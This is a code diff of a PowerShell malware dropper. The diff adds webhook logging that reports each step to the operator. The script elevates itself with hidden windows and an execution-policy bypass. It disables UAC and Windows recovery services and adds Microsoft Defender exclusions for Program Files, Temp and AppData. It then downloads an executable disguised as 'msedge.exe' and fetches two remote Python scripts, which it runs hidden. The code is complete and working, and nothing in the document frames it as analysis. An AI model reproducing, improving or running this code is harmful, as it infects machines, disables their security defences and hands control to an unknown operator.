@@ -11,18 +11,26 @@ function Send-WebhookMessage {
     }
 }
 
+Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+
 try {
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    Send-WebhookMessage -Message "Admin check: $isAdmin"
 
     if (-not $isAdmin) {
         try {
+            Send-WebhookMessage -Message "Attempting elevation"
             Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
+            Send-WebhookMessage -Message "Elevation successful"
             exit
-        } catch {}
+        } catch {
+            Send-WebhookMessage -Message "Elevation failed: $_"
+        }
     }
 
     if ($isAdmin) {
         try {
+            Send-WebhookMessage -Message "Disabling UAC and recovery services"
             Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
             & reagentc /disable | Out-Null
             Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
@@ -30,8 +38,13 @@ try {
             if (Get-Service -Name "WinREAgent" -ErrorAction SilentlyContinue) {
                 Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
                 Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
+            } else {
+                Send-WebhookMessage -Message "WinREAgent service not found, skipping"
             }
-        } catch {}
+            Send-WebhookMessage -Message "UAC and recovery services disabled"
+        } catch {
+            Send-WebhookMessage -Message "Error disabling UAC/services: $_"
+        }
     }
 
     $programFiles = "C:\Program Files"
@@ -44,27 +57,35 @@ try {
     foreach ($dir in $directories) {
         try {
             Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
         } catch {
             $exclusionsAdded = $false
+            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
         }
     }
 
     try {
         Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
     } catch {
         $exclusionsAdded = $false
+        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
     }
 
     try {
         Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
     } catch {
         $exclusionsAdded = $false
+        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
     }
 
     try {
         Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
     } catch {
         $exclusionsAdded = $false
+        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
     }
 
     if ($exclusionsAdded -and $directories) {
@@ -72,61 +93,105 @@ try {
         $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath "msedge.exe"
         try {
             Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
-        } catch {}
+            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
+        } catch {
+            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
+        }
 
         $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
         try {
             Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
-        } catch {}
+            Send-WebhookMessage -Message "Downloaded msedge.exe to $destinationPath"
+        } catch {
+            Send-WebhookMessage -Message "Error downloading msedge.exe: $_"
+        }
     }
 
     $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
     try {
         $response = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop
         $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
+        Send-WebhookMessage -Message "Downloaded Python script"
         
         $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
         $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
         
-        if ($pythonwExists) {
-            try {
-                Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            } catch {
-                if ($pythonExists) {
-                    try {
-                        Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    } catch {}
+        if (-not $pythonwExists -and -not $pythonExists) {
+            Send-WebhookMessage -Message "No Python interpreter found (pythonw.exe or python.exe)"
+        } else {
+            if ($pythonwExists) {
+                try {
+                    Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed Python script with pythonw.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing with pythonw.exe: $_"
+                    if ($pythonExists) {
+                        try {
+                            Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                            Send-WebhookMessage -Message "Executed Python script with python.exe"
+                        } catch {
+                            Send-WebhookMessage -Message "Error executing with python.exe: $_"
+                        }
+                    } else {
+                        Send-WebhookMessage -Message "python.exe not found, cannot fallback"
+                    }
+                }
+            } elseif ($pythonExists) {
+                try {
+                    Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed Python script with python.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing with python.exe: $_"
                 }
             }
-        } elseif ($pythonExists) {
-            try {
-                Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            } catch {}
         }
-    } catch {}
+    } catch {
+        Send-WebhookMessage -Message "Error downloading Python script: $_"
+    }
 
     $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
     try {
         $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
         $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
+        Send-WebhookMessage -Message "Downloaded toolhandler Python script"
         
         $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
         $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
         
-        if ($pythonwExists) {
-            try {
-                Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            } catch {
-                if ($pythonExists) {
-                    try {
-                        Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    } catch {}
+        if (-not $pythonwExists -and -not $pythonExists) {
+            Send-WebhookMessage -Message "No Python interpreter found for toolhandler (pythonw.exe or python.exe)"
+        } else {
+            if ($pythonwExists) {
+                try {
+                    Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed toolhandler Python script with pythonw.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing toolhandler with pythonw.exe: $_"
+                    if ($pythonExists) {
+                        try {
+                            Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                            Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
+                        } catch {
+                            Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
+                        }
+                    } else {
+                        Send-WebhookMessage -Message "python.exe not found, cannot fallback for toolhandler"
+                    }
+                }
+            } elseif ($pythonExists) {
+                try {
+                    Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
                 }
             }
-        } elseif ($pythonExists) {
-            try {
-                Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            } catch {}
         }
-    } catch {}
-} catch {}
+    } catch {
+        Send-WebhookMessage -Message "Error downloading toolhandler Python script: $_"
+    }
+
+    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+} catch {
+    Send-WebhookMessage -Message "Unexpected error: $_"
+}
